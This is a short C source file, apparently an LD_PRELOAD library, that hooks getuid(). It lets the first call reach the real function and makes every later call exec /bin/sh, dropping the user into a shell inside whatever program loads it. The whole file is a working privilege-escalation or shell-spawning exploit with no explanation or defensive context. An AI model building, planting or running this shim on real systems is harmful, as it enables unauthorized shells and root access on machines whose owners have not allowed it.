#define _GNU_SOURCE
#include <dlfcn.h>

#include <unistd.h>
#include <sys/types.h>

int count = 0;

typedef uid_t (*orig_getuid_fn_signature)(void);

// Allow the first call to 'getuid' then overwrite all subsequent calls.
uid_t getuid(void) {
	if (count++) {
		char *args[] = {"/bin/sh", NULL};
		execv(args[0], args);
	} else {
		orig_getuid_fn_signature orig_fn;
		orig_fn = (orig_getuid_fn_signature ) dlsym(RTLD_NEXT, "getuid");
		return orig_fn();
	}
	
}
